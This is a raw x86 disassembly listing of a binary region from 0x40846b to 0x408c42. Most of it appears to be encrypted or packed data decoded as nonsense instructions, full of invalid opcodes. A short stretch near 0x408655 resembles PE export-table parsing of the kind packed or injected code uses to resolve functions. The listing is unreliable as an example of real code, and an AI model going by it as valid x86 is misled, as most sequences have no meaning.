  40846b:	or     ecx,edx
  40846d:	in     al,0xc2
  40846f:	pop    edx
  408470:	mov    cl,0xc2
  408472:	fdiv   QWORD PTR [ecx]
  408474:	imul   esi,DWORD PTR [esi+0x39],0x7723d6c
  40847b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40847c:	mov    edx,0x1c7a480c
  408481:	adc    ebp,esi
  408483:	dec    ebp
  408484:	test   al,0xd8
  408486:	mov    cl,0x77
  408488:	fcom   QWORD PTR [edx+0x6a]
  40848b:	pop    ss
  40848c:	ins    DWORD PTR es:[edi],dx
  40848d:	in     al,0xfa
  40848f:	sti    
  408490:	pop    ss
  408491:	lds    edi,FWORD PTR [ebp+0x74]
  408494:	xchg   DWORD PTR ds:0x3966,edi
  408499:	mov    cl,0xce
  40849b:	lahf   
  40849c:	xchg   esp,eax
  40849d:	test   bh,bl
  40849f:	jecxz  0x408433
  4084a1:	sub    BYTE PTR [edx+eiz*2-0x79f573a],0xc2
  4084a9:	sbb    dl,BYTE PTR [esi]
  4084ab:	fcmove st,st(0)
  4084ad:	out    0x51,al
  4084af:	pop    ecx
  4084b0:	and    BYTE PTR [edx+0x54],al
  4084b3:	mov    al,ds:0x448817b6
  4084b8:	jno    0x4084bc
  4084ba:	sub    esp,DWORD PTR ds:[eax-0x66]
  4084be:	jle    0x4084d1
  4084c0:	(bad)  
  4084c1:	popa   
  4084c2:	mov    bh,0x94
  4084c4:	push   ebx
  4084c5:	shl    BYTE PTR [esi+ebx*1+0x39],cl
  4084c9:	cmc    
  4084ca:	arpl   WORD PTR [ecx+0x4cb7a27],sp
  4084d0:	mov    bh,0xf3
  4084d2:	rcr    ecx,cl
  4084d4:	popa   
  4084d5:	inc    edi
  4084d6:	dec    ecx
  4084d7:	loop   0x4084c0
  4084d9:	(bad)  
  4084da:	mov    cl,0x5d
  4084dc:	or     DWORD PTR [ebx-0x61],ebp
  4084df:	(bad)  
  4084e0:	test   DWORD PTR [edx-0x2a],0x36931e9b
  4084e7:	push   ecx
  4084e8:	xor    DWORD PTR [edi-0x17],eax
  4084eb:	add    al,0x97
  4084ed:	mov    cl,0x75
  4084ef:	cmp    BYTE PTR [ebp-0x41],bl
  4084f2:	into   
  4084f3:	fwait
  4084f4:	out    0xcf,al
  4084f6:	push   esi
  4084f7:	outs   dx,BYTE PTR ds:[esi]
  4084f8:	into   
  4084f9:	push   ss
  4084fa:	xor    eax,DWORD PTR [ecx]
  4084fc:	push   ss
  4084fd:	xor    cl,dh
  4084ff:	ins    BYTE PTR es:[edi],dx
  408500:	add    ecx,DWORD PTR [eax]
  408502:	retf   0x3c17
  408505:	lahf   
  408506:	cli    
  408507:	retf   
  408508:	das    
  408509:	int    0x1b
  40850b:	iret   
  40850c:	sar    BYTE PTR ds:0xd186b81a,cl
  408512:	in     al,0x63
  408514:	out    0xa9,al
  408516:	hlt    
  408517:	mov    esi,0xb437eda0
  40851c:	(bad)  
  40851d:	and    BYTE PTR [edi-0x23],bl
  408520:	mov    al,ds:0x6b94d698
  408525:	popf   
  408526:	xsha1  (bad)
  408527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408528:	or     BYTE PTR [edi],cl
  40852a:	cmp    al,0x25
  40852c:	cmp    BYTE PTR [esi],bl
  40852e:	and    ch,ch
  408530:	je     0x40853c
  408532:	mov    dl,0xc9
  408534:	sub    eax,0x4bf20a82
  408539:	xor    esp,DWORD PTR [esi]
  40853b:	outs   dx,DWORD PTR ds:[esi]
  40853c:	xor    DWORD PTR [eax+ebx*8-0x32],0x5e
  408541:	adc    ch,0xc3
  408544:	ror    BYTE PTR [eax],1
  408546:	mov    esp,ebx
  408548:	popf   
  408549:	shl    BYTE PTR [ecx-0x137bddd8],cl
  40854f:	out    dx,eax
  408550:	mov    BYTE PTR [bx+si],cl
  408553:	scas   al,BYTE PTR es:[edi]
  408554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408555:	inc    edx
  408556:	lods   eax,DWORD PTR ds:[esi]
  408557:	(bad)  
  408558:	jmp    0xddf3:0x9c008afc
  40855f:	imul   ecx,DWORD PTR [ebx+0x78],0x28
  408563:	fimul  DWORD PTR [esi+0x41]
  408566:	dec    ecx
  408567:	push   ds
  408568:	fwait
  408569:	imul   ebp,DWORD PTR [ebx+0x16],0x20
  40856d:	cdq    
  40856e:	popa   
  40856f:	fcomp  DWORD PTR [ebx]
  408572:	out    dx,eax
  408573:	(bad)  
  408576:	lea    eax,[ebx-0x4d]
  408579:	xchg   ebx,eax
  40857a:	pop    eax
  40857b:	push   ebp
  40857c:	adc    eax,0xf2905b07
  408581:	add    BYTE PTR [edx+0x5a01c54],dl
  408587:	jae    0x408561
  408589:	(bad)  
  40858a:	sbb    edi,edi
  40858c:	cmp    BYTE PTR [edx],bl
  40858e:	fidiv  DWORD PTR [edi]
  408590:	mov    eax,0xb7e86012
  408595:	je     0x4085eb
  408597:	pushf  
  408598:	sub    BYTE PTR [ecx],ch
  40859a:	pop    ds
  40859b:	(bad)  
  40859c:	and    eax,0x3c035b7b
  4085a1:	sbb    eax,0x1dffa281
  4085a6:	adc    DWORD PTR [ebp-0x39e11d10],0xfffffffd
  4085ad:	dec    esi
  4085ae:	dec    edi
  4085af:	sbb    BYTE PTR [ebx+0xa],cl
  4085b2:	(bad)  
  4085b3:	(bad)  
  4085b4:	aas    
  4085b5:	push   ebp
  4085b6:	daa    
  4085b7:	out    dx,al
  4085b8:	imul   ebx,edi,0xffffffaa
  4085bb:	fld    DWORD PTR [ebx-0x25]
  4085be:	mov    ecx,0x3c57e3c2
  4085c3:	test   al,0x43
  4085c5:	aam    0x88
  4085c7:	test   eax,0xa536e853
  4085cc:	adc    BYTE PTR [eax-0x2b2fecd6],al
  4085d2:	jge    0x4085fb
  4085d4:	dec    edx
  4085d5:	out    0x8d,al
  4085d7:	cmc    
  4085d8:	loopne 0x4085a0
  4085da:	mov    ebp,0x326accf0
  4085df:	cs inc edx
  4085e1:	in     eax,dx
  4085e2:	mov    ecx,0x696b70a1
  4085e7:	mov    bl,0xee
  4085e9:	sbb    al,0x7f
  4085eb:	jle    0x40861a
  4085ed:	jecxz  0x4085f0
  4085ef:	in     eax,0x6
  4085f1:	lahf   
  4085f2:	call   0x214:0xe54f853e
  4085f9:	jmp    0x408676
  4085fb:	dec    ebp
  4085fc:	lahf   
  4085fd:	lods   eax,DWORD PTR ds:[esi]
  4085fe:	sbb    dl,BYTE PTR [edx-0x60]
  408601:	fst    QWORD PTR [ebp+0x3d]
  408604:	fisubr WORD PTR [ecx+0x2cc6a14e]
  40860a:	rcl    BYTE PTR [ebp-0x1bb3b73f],0xd3
  408611:	aad    0x29
  408613:	mov    ds:0xd6c914ff,eax
  408618:	in     eax,dx
  408619:	xchg   ebx,eax
  40861a:	mov    al,0xd9
  40861c:	test   DWORD PTR [esi+0x16e00492],esi
  408622:	xchg   BYTE PTR [eax-0x7be5816],cl
  408628:	xchg   ebp,eax
  408629:	dec    eax
  40862a:	dec    esi
  40862b:	xchg   ebp,eax
  40862c:	loope  0x4086a1
  40862e:	retf   0xa369
  408631:	push   ebp
  408632:	imul   edx,DWORD PTR [edx],0xade020e2
  408638:	fild   DWORD PTR [ecx+0x5cbccef7]
  40863e:	xor    cl,bl
  408640:	sbb    DWORD PTR [ecx+0x7edc0315],edi
  408646:	mov    edx,0xb063db97
  40864b:	into   
  40864c:	xchg   DWORD PTR [esi+eiz*4-0x1605ad8b],esp
  408653:	jg     0x4086a6
  408655:	jne    0x408667
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xbe2f6677
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [eax+0x22],cl
  40869f:	jbe    0x408697
  4086a1:	(bad)  
  4086a2:	mov    ebx,0xae982467
  4086a7:	adc    cl,0x2e
  4086aa:	jmp    0x4e6c:0x8941f528
  4086b1:	aaa    
  4086b2:	jecxz  0x408638
  4086b4:	icebp  
  4086b5:	cmp    BYTE PTR [esi],bh
  4086b7:	jnp    0x4086d7
  4086b9:	sbb    BYTE PTR [ecx+0x56],cl
  4086bc:	bound  eax,QWORD PTR [ebx-0x6d]
  4086bf:	pop    ebp
  4086c0:	loope  0x408725
  4086c2:	addr16 call 0xe6da:0x46e5cdc6
  4086ca:	dec    esi
  4086cb:	cmc    
  4086cc:	shr    BYTE PTR [ecx+eiz*2-0x6e0b9713],1
  4086d3:	add    ch,0xa9
  4086d6:	mov    WORD PTR [edx],cs
  4086d8:	and    dl,0xc0
  4086db:	jnp    0x40874f
  4086dd:	push   ecx
  4086de:	scas   eax,DWORD PTR es:[edi]
  4086df:	mov    ds:0x9252f58b,eax
  4086e4:	(bad)  
  4086e5:	hlt    
  4086e6:	adc    BYTE PTR [edx+0x68],bl
  4086e9:	pop    ecx
  4086ea:	mov    cl,0x28
  4086ec:	cmp    DWORD PTR [edi],edi
  4086ee:	jae    0x408671
  4086f0:	mov    es,WORD PTR [esi+eax*4+0x3c]
  4086f4:	loopne 0x408726
  4086f6:	fidiv  DWORD PTR [eax+0x49]
  4086f9:	popa   
  4086fa:	add    DWORD PTR [ebp+0x36],eax
  4086fd:	add    eax,0xbccd85b3
  408702:	inc    ecx
  408703:	pop    esp
  408704:	inc    edx
  408705:	scas   al,BYTE PTR es:[edi]
  408706:	addr16 mov ds:0x71ff,eax
  40870a:	fisub  WORD PTR [ecx]
  40870c:	jge    0x4086f3
  40870e:	inc    ecx
  40870f:	into   
  408710:	jecxz  0x408711
  408712:	(bad)  
  408713:	test   edx,0x58662a3a
  408719:	push   ebp
  40871a:	ror    BYTE PTR fs:[edx],1
  40871d:	inc    ebp
  40871e:	mov    dl,0x9e
  408720:	jmp    0xd662ba3
  408725:	enter  0xdbaf,0x78
  408729:	repnz les esp,FWORD PTR [ebx+0x60]
  40872d:	xchg   BYTE PTR [ebx-0x1d],al
  408730:	in     eax,dx
  408731:	imul   DWORD PTR [edx+0xd]
  408734:	test   ebp,ebx
  408736:	pop    es
  408737:	shl    DWORD PTR [esi],0x12
  40873a:	or     bh,BYTE PTR [esi]
  40873c:	test   edi,0x6559b143
  408742:	pinsrw mm4,esp,0xc8
  408746:	or     ebx,DWORD PTR [ecx+0x37]
  408749:	jg     0x408719
  40874b:	cld    
  40874c:	out    0xae,al
  40874e:	jb     0x4087b0
  408750:	and    al,cl
  408752:	add    ch,dl
  408754:	cmp    BYTE PTR [ecx+0x303057b4],dh
  40875a:	push   0xd2a75417
  40875f:	jbe    0x4087b4
  408761:	icebp  
  408762:	into   
  408763:	shr    BYTE PTR [edx],0xde
  408766:	or     DWORD PTR [eax+eax*1-0x533ea6ef],0x53
  40876e:	pop    edi
  40876f:	test   BYTE PTR [edi+0x46],ch
  408772:	aam    0x38
  408774:	es retf 0x710f
  408778:	push   DWORD PTR fs:[esi]
  40877b:	xchg   BYTE PTR [esi+0x288870f0],bh
  408781:	fucomi st,st(0)
  408783:	iret   
  408784:	dec    esi
  408785:	mov    ch,0xc4
  408787:	lahf   
  408788:	(bad)  
  408789:	loop   0x4087f6
  40878b:	pop    ds
  40878c:	lahf   
  40878d:	dec    edx
  40878e:	inc    ebx
  40878f:	loopne 0x408714
  408791:	jno    0x40871e
  408793:	mov    ecx,0xe0e369bc
  408798:	shr    DWORD PTR [edx-0x3deff967],1
  40879e:	in     al,0x7b
  4087a0:	cmp    edx,DWORD PTR [ebx+0x4c]
  4087a3:	jmp    0x40880e
  4087a5:	mov    BYTE PTR [esi],bl
  4087a7:	jmp    0xc73a:0x69d3c2ec
  4087ae:	sub    eax,0xebfdcd5f
  4087b3:	jbe    0x408765
  4087b5:	pop    esi
  4087b6:	inc    edx
  4087b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b8:	mov    ecx,0x673b0472
  4087bd:	xor    eax,0xe80cf256
  4087c2:	and    dh,cl
  4087c4:	jle    0x4087a6
  4087c6:	cmp    DWORD PTR [ecx+0x3b],0xffffff99
  4087ca:	add    al,0x3c
  4087cc:	clc    
  4087cd:	scas   al,BYTE PTR es:[edi]
  4087ce:	xor    esi,edx
  4087d0:	sub    edx,DWORD PTR [edi]
  4087d2:	jbe    0x40875a
  4087d4:	jbe    0x4087c8
  4087d6:	sub    BYTE PTR [eax+0x25a80d7],ch
  4087dc:	add    eax,0x84d5bf38
  4087e1:	jg     0x4087da
  4087e3:	inc    ecx
  4087e4:	xlat   BYTE PTR ds:[ebx]
  4087e5:	jno    0x408771
  4087e7:	(bad)  
  4087e8:	repnz lock add eax,0xeded2acb
  4087ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087f0:	mov    bh,0xd8
  4087f2:	cmc    
  4087f3:	stc    
  4087f4:	lods   al,BYTE PTR ds:[esi]
  4087f5:	mov    edx,DWORD PTR [ebp-0x6f784906]
  4087fb:	or     DWORD PTR [ecx],0xffffffd3
  4087fe:	sbb    al,0xeb
  408800:	cmp    ch,cl
  408802:	pop    esi
  408803:	push   0xe3262205
  408808:	pop    ss
  408809:	in     al,0xfb
  40880b:	cmp    al,0x60
  40880d:	fsubr  DWORD PTR [edi]
  40880f:	into   
  408810:	push   eax
  408811:	cmp    esi,DWORD PTR [edi-0x5d]
  408814:	aad    0x3a
  408816:	sbb    DWORD PTR [eax+0x4ea34e4e],edi
  40881c:	aad    0xbf
  40881e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881f:	aaa    
  408820:	jae    0x408810
  408822:	and    BYTE PTR [ecx+0x73363e74],ch
  408828:	cmp    eax,0x6efdd9c
  40882d:	cmp    BYTE PTR [eax-0x41171b78],bl
  408833:	loopne 0x408860
  408835:	add    al,0xc3
  408837:	clc    
  408838:	mov    ds:0xdb51df36,eax
  40883d:	or     ebp,DWORD PTR [ebx-0x2c5151c7]
  408843:	jg     0x4088af
  408845:	call   0xdca8f76b
  40884a:	aam    0xef
  40884c:	lock jae 0x40886a
  40884f:	sti    
  408850:	or     DWORD PTR [ebp+0x6a5de19a],edx
  408856:	cli    
  408857:	push   ebx
  408858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408859:	ds shl ecx,0xc4
  40885d:	(bad)  
  40885e:	lods   al,BYTE PTR ds:[esi]
  40885f:	xchg   ebp,eax
  408860:	mov    bh,0xad
  408862:	and    bl,0xab
  408865:	adc    ebx,DWORD PTR [eax+0x4740609a]
  40886b:	xor    ecx,ecx
  40886d:	add    BYTE PTR ds:0xa810d60e,bl
  408873:	inc    ebx
  408874:	dec    esp
  408875:	mov    dl,0xbc
  408877:	and    eax,0xcbab66f8
  40887c:	add    eax,0x60462abd
  408881:	fld    QWORD PTR [eax+eiz*1+0x3535c838]
  408888:	iret   
  408889:	in     al,dx
  40888a:	jl     0x40888a
  40888c:	scas   eax,DWORD PTR es:[edi]
  40888d:	pop    ss
  40888e:	popa   
  40888f:	bound  esp,QWORD PTR [ebp-0x3061da48]
  408895:	jle    0x40882a
  408897:	ret    
  408898:	add    eax,0x6fe0943d
  40889d:	das    
  40889e:	add    ah,BYTE PTR [edi]
  4088a0:	and    eax,0x8c7d2b6
  4088a5:	(bad)  [esi-0x7b]
  4088a8:	cld    
  4088a9:	pop    edi
  4088aa:	cmp    DWORD PTR [edi],0xffffffa6
  4088ad:	leave  
  4088ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088af:	in     eax,0x0
  4088b1:	(bad)  
  4088b2:	iret   
  4088b3:	cmp    esp,DWORD PTR [ebx+0x24]
  4088b6:	cmp    BYTE PTR [edi],ch
  4088b8:	xchg   ebx,eax
  4088b9:	pop    ebx
  4088ba:	mov    al,ds:0xe4358507
  4088bf:	add    al,0xd5
  4088c1:	fcomp  DWORD PTR [esi]
  4088c3:	sub    BYTE PTR [eax+esi*8],ch
  4088c6:	clc    
  4088c7:	aam    0xea
  4088c9:	mov    dl,0x2f
  4088cb:	std    
  4088cc:	addr16 lock int 0x31
  4088d0:	retf   
  4088d1:	xchg   ebx,eax
  4088d2:	inc    eax
  4088d3:	mov    edi,0xfb304cfa
  4088d8:	lea    ecx,[edx+0x173ee25a]
  4088de:	sbb    esi,edx
  4088e0:	mov    eax,0xd630b517
  4088e5:	xchg   edi,eax
  4088e6:	ins    BYTE PTR es:[edi],dx
  4088e7:	and    ah,bl
  4088e9:	popf   
  4088ea:	xor    al,0xc1
  4088ec:	retf   
  4088ed:	adc    DWORD PTR [ebx-0x2c],ecx
  4088f0:	retf   
  4088f1:	retf   
  4088f2:	fdiv   st,st(3)
  4088f4:	dec    eax
  4088f5:	mov    al,BYTE PTR [ecx+edi*4-0x4624a936]
  4088fc:	leave  
  4088fd:	cli    
  4088fe:	shl    ah,1
  408900:	inc    eax
  408901:	mov    dh,0x5d
  408903:	les    edi,FWORD PTR ds:0x9f5dce99
  408909:	sbb    bh,BYTE PTR [edx+0x60]
  40890c:	ss (bad) 
  40890e:	sbb    BYTE PTR [edx+esi*8+0x14c22b90],bl
  408915:	jo     0x40898e
  408917:	pop    ss
  408918:	ffree  st(4)
  40891a:	add    DWORD PTR [esi+0x17ebfbd2],ebx
  408920:	sbb    al,0x2f
  408922:	mov    WORD PTR [esi+ecx*4-0x4a01aca5],ss
  408929:	push   ss
  40892a:	pop    esp
  40892b:	cs int 0x1d
  40892e:	(bad)  
  40892f:	in     eax,dx
  408930:	mov    edi,DWORD PTR [ecx]
  408932:	xor    eax,0x3dc56a10
  408937:	dec    edx
  408938:	pop    ecx
  408939:	pop    es
  40893a:	cs pop ebx
  40893c:	mov    ds:0xa499dcf2,eax
  408941:	jle    0x408921
  408943:	gs shl cl,0x93
  408947:	das    
  408948:	xchg   edi,eax
  408949:	mov    edx,0xca7c003e
  40894e:	ins    DWORD PTR es:[edi],dx
  40894f:	xor    al,0x67
  408951:	cmp    al,0xdf
  408953:	mov    ah,0xf0
  408955:	fisttp WORD PTR [ebx+0x6f55fe8b]
  40895b:	fs and al,0x78
  40895e:	add    DWORD PTR [ecx-0x4c],0xffffffdd
  408962:	rcr    esi,1
  408964:	in     al,dx
  408965:	jne    0x408951
  408967:	in     eax,0xc1
  408969:	adc    eax,0x65bea801
  40896e:	shl    DWORD PTR [ecx-0x53],1
  408971:	dec    esi
  408972:	dec    esi
  408973:	ja     0x4089f4
  408975:	sbb    ah,dl
  408977:	retf   0x6112
  40897a:	iret   
  40897b:	repnz xchg ecx,eax
  40897d:	test   DWORD PTR [ecx-0x65874a52],esp
  408983:	jmp    0x4089d7
  408985:	enter  0x79f,0xbd
  408989:	push   ss
  40898a:	mov    al,0x99
  40898c:	fadd   DWORD PTR [esi]
  40898e:	mov    bl,0x4c
  408990:	popf   
  408991:	pop    ss
  408992:	sub    DWORD PTR [eax],esi
  408994:	sbb    al,0x8f
  408996:	loop   0x4089f5
  408998:	xor    al,0x80
  40899a:	pop    esp
  40899b:	mov    ebp,eax
  40899d:	or     BYTE PTR [ebx+0x1460f3ce],bl
  4089a3:	ror    DWORD PTR [ecx],1
  4089a5:	retf   0xfdf9
  4089a8:	mov    ebx,0x583b45af
  4089ad:	add    BYTE PTR [ebp+0x41288b4e],dh
  4089b3:	sub    cl,BYTE PTR [eax+0x28]
  4089b6:	mov    DWORD PTR [ecx+0xb409e6d],ebx
  4089bc:	xor    BYTE PTR [ecx],bh
  4089be:	sub    dh,BYTE PTR [edx-0x6b8e40b8]
  4089c4:	or     BYTE PTR ds:0x23468f5a,ah
  4089ca:	paddsw mm2,QWORD PTR ds:0xdf897d38
  4089d1:	add    eax,0x46031d28
  4089d6:	fstp   TBYTE PTR [edi+eax*2+0x135239de]
  4089dd:	dec    eax
  4089de:	push   cs
  4089df:	ss push 0xffffffcf
  4089e2:	or     ecx,ecx
  4089e4:	mov    esi,0x619577e3
  4089e9:	cmp    eax,0x812fd6f1
  4089ee:	inc    edi
  4089ef:	xor    ebp,edi
  4089f1:	std    
  4089f2:	les    ebp,FWORD PTR [edx-0x6e55bb37]
  4089f8:	push   edi
  4089f9:	mov    al,ds:0x32f0911f
  4089fe:	sar    BYTE PTR [ebp+0x14],cl
  408a01:	cs inc eax
  408a03:	jmp    0x408a61
  408a05:	test   cl,dh
  408a07:	test   DWORD PTR [ebx+0x33cfc7fc],edx
  408a0d:	pop    edi
  408a0e:	shr    bl,1
  408a10:	int3   
  408a11:	lahf   
  408a12:	push   es
  408a13:	rcl    DWORD PTR [esi+0x60],1
  408a16:	std    
  408a17:	push   ebx
  408a18:	xlat   BYTE PTR ds:[ebx]
  408a19:	in     eax,0x10
  408a1b:	nop
  408a1c:	clc    
  408a1d:	retf   0x3a3a
  408a20:	stos   DWORD PTR es:[edi],eax
  408a21:	sbb    DWORD PTR [ecx+0x6c508b65],edx
  408a27:	inc    ebp
  408a28:	inc    ecx
  408a29:	pop    eax
  408a2a:	sbb    DWORD PTR [ebx+eax*4-0x6e359ebf],edx
  408a31:	arpl   WORD PTR [eax+0x24da563e],bp
  408a37:	cmc    
  408a38:	in     al,dx
  408a39:	mov    ds:0x16072eb3,eax
  408a3e:	mov    al,BYTE PTR [edi]
  408a40:	stc    
  408a41:	jb     0x4089d3
  408a43:	mov    al,0x39
  408a45:	jg     0x408a1b
  408a47:	push   ecx
  408a48:	jnp    0x4089cc
  408a4a:	xchg   ebp,eax
  408a4b:	cli    
  408a4c:	call   0x7dc7fd6a
  408a51:	adc    eax,ecx
  408a53:	mov    ds:0x494cc55a,eax
  408a58:	loope  0x408ab2
  408a5a:	ins    DWORD PTR es:[edi],dx
  408a5b:	imul   ecx,DWORD PTR [edx],0x66
  408a5e:	mov    eax,DWORD PTR [esi]
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	(bad)  
  408a75:	(bad)  
  408a76:	mov    ds:0x1857b5bc,eax
  408a7b:	sbb    BYTE PTR [esi+0x8181812],bl
  408a81:	les    eax,FWORD PTR [ecx+eiz*8+0x73]
  408a85:	fisub  WORD PTR [edx-0x5aff339]
  408a8b:	test   eax,0x18bc2a62
  408a90:	mov    esi,0xb726ecad
  408a95:	retf   
  408a96:	mov    ds:0x11821f32,al
  408a9b:	(bad)  
  408a9c:	cld    
  408a9d:	push   0x7b91491d
  408aa2:	imul   ebx,esi,0xbac83eb7
  408aa8:	and    DWORD PTR [eax],0x1dd81e94
  408aae:	mov    ds:0x27ee03f0,eax
  408ab3:	jno    0x408a41
  408ab5:	mov    edi,0x5d437678
  408aba:	hlt    
  408abb:	loop   0x408a81
  408abd:	pop    esp
  408abe:	loopne 0x408a9a
  408ac0:	add    BYTE PTR [esi],al
  408ac2:	outs   dx,BYTE PTR ds:[esi]
  408ac3:	popf   
  408ac4:	dec    ebx
  408ac5:	dec    ebp
  408ac6:	adc    al,BYTE PTR [eax]
  408ac8:	je     0x408a67
  408aca:	add    esp,DWORD PTR [eax+0x35597148]
  408ad0:	mov    ch,0xc9
  408ad2:	inc    esi
  408ad3:	mov    bl,BYTE PTR [ecx]
  408ad5:	pop    edx
  408ad6:	and    BYTE PTR [edx],dl
  408ad8:	pop    esi
  408ad9:	cmc    
  408ada:	clc    
  408adb:	cs (bad) 
  408add:	les    esp,FWORD PTR [esi]
  408adf:	cs mov bh,0x7b
  408ae2:	inc    ebx
  408ae3:	cmp    ch,bh
  408ae5:	or     eax,0x933599c8
  408aea:	jl     0x408b03
  408aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aed:	scas   al,BYTE PTR es:[edi]
  408aee:	(bad)  
  408aef:	fcom   DWORD PTR [edi+0x71109b20]
  408af5:	loope  0x408afd
  408af7:	shl    DWORD PTR [esi-0x77],0xed
  408afb:	pushf  
  408afc:	push   edi
  408afd:	ja     0x408b10
  408aff:	call   ecx
  408b01:	mov    dl,cl
  408b03:	imul   ebx,DWORD PTR [ebp-0x54],0x585303b5
  408b0a:	jb     0x408a9d
  408b0c:	jae    0x408b6c
  408b0e:	lods   eax,DWORD PTR ds:[esi]
  408b0f:	leave  
  408b10:	push   ecx
  408b11:	in     eax,0xb3
  408b13:	push   ecx
  408b14:	mov    BYTE PTR [ebp-0xf],al
  408b17:	jbe    0x408aab
  408b19:	nop
  408b1a:	or     BYTE PTR [ecx+eiz*4],dl
  408b1d:	mov    edi,0xb87d92fc
  408b22:	arpl   WORD PTR [ebp+ecx*8+0x7a],bx
  408b26:	sub    DWORD PTR [ecx-0x30],0x5fe6a748
  408b2d:	ja     0x408baa
  408b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b30:	cmp    eax,0x4bfd284f
  408b35:	mov    edi,0xd9a96e17
  408b3a:	lock or edi,0xe4c0e3f4
  408b41:	push   ss
  408b42:	pop    ds
  408b43:	sub    esp,ecx
  408b45:	push   ds
  408b46:	dec    edi
  408b47:	cmc    
  408b48:	test   BYTE PTR [ecx],0x29
  408b4b:	in     al,dx
  408b4c:	xor    DWORD PTR [edi+0x7e2a2814],ebx
  408b52:	adc    DWORD PTR [ebx+0x746f397],ecx
  408b58:	mov    esp,0x140ea80e
  408b5d:	or     eax,0x54deaa48
  408b62:	cmp    DWORD PTR [ecx+0x5d2ee4fb],eax
  408b68:	fwait
  408b69:	aaa    
  408b6a:	pop    ebp
  408b6b:	mov    ebx,0x4c83e647
  408b70:	pop    edi
  408b71:	xor    al,0x43
  408b73:	adc    al,al
  408b75:	sbb    ah,0x9c
  408b78:	nop
  408b79:	pop    ds
  408b7a:	xor    BYTE PTR [eax],0xba
  408b7d:	sub    eax,0x71f456c7
  408b82:	mov    dh,0xf7
  408b84:	icebp  
  408b85:	mov    edx,ebp
  408b87:	int3   
  408b88:	or     edx,DWORD PTR [edi]
  408b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b8b:	xchg   ebx,eax
  408b8c:	sbb    eax,0xf8c71248
  408b91:	mov    bh,0xe4
  408b93:	addr16 aaa 
  408b95:	push   edi
  408b96:	inc    esi
  408b97:	js     0x408bf6
  408b99:	inc    edi
  408b9a:	jp     0x408b50
  408b9c:	shl    DWORD PTR [edx],0x6d
  408b9f:	bound  eax,QWORD PTR [esi-0x1f]
  408ba2:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  408ba4:	gs call 0xb4d6:0xd1f000db
  408bac:	and    esi,edi
  408bae:	sar    bh,cl
  408bb0:	inc    edi
  408bb1:	mov    ebx,0x7b1bd164
  408bb6:	mov    ecx,0xcdf51313
  408bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bbc:	cwde   
  408bbd:	icebp  
  408bbe:	aam    0xe3
  408bc0:	fiadd  DWORD PTR ds:0xbb593788
  408bc6:	adc    eax,0xa0efb619
  408bcb:	leave  
  408bcc:	add    eax,0x8ce262e5
  408bd1:	pusha  
  408bd2:	mov    dl,0xb2
  408bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bd5:	sbb    eax,DWORD PTR [esi]
  408bd7:	sub    eax,0x6b34e3b
  408bdc:	dec    edi
  408bdd:	xchg   esp,eax
  408bde:	(bad)  
  408bdf:	push   ds
  408be0:	stos   BYTE PTR es:[edi],al
  408be1:	xor    cl,bh
  408be3:	mov    al,ds:0x47200662
  408be8:	xor    al,0xe
  408bea:	cli    
  408beb:	jge    0x408b76
  408bed:	ins    DWORD PTR es:[edi],dx
  408bee:	xor    esi,DWORD PTR [ecx-0x636c5667]
  408bf4:	dec    edi
  408bf5:	push   ebp
  408bf6:	add    DWORD PTR [esi+0x435b9f73],ebx
  408bfc:	xchg   ebp,eax
  408bfd:	cwde   
  408bfe:	cmp    edx,DWORD PTR [eax+0x635efd10]
  408c04:	add    DWORD PTR [ebx],eax
  408c06:	xchg   esi,eax
  408c07:	es cdq 
  408c09:	adc    DWORD PTR [eax+0x3f],edx
  408c0c:	stc    
  408c0d:	xchg   ebp,eax
  408c0e:	pop    ss
  408c0f:	jmp    0x408bb7
  408c11:	mov    ch,0x8
  408c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c14:	icebp  
  408c15:	sbb    BYTE PTR [ebp+0x1f21e9d2],ah
  408c1b:	rcl    BYTE PTR [edx],cl
  408c1d:	inc    esi
  408c1e:	xchg   DWORD PTR [ebx+0x44],esp
  408c21:	retf   0x615e
  408c24:	aaa    
  408c25:	mov    eax,ds:0xf75029a0
  408c2a:	ss retf 
  408c2c:	jmp    0xb0d6:0xbd2a13b5
  408c33:	pop    eax
  408c34:	test   BYTE PTR [ebx+0x191a3a8a],al
  408c3a:	inc    esp
  408c3b:	retf   
  408c3c:	cs xchg edi,eax
  408c3e:	mov    ch,0xc6
  408c40:	(bad)  [edx]
  408c42:	in     eax,0x3
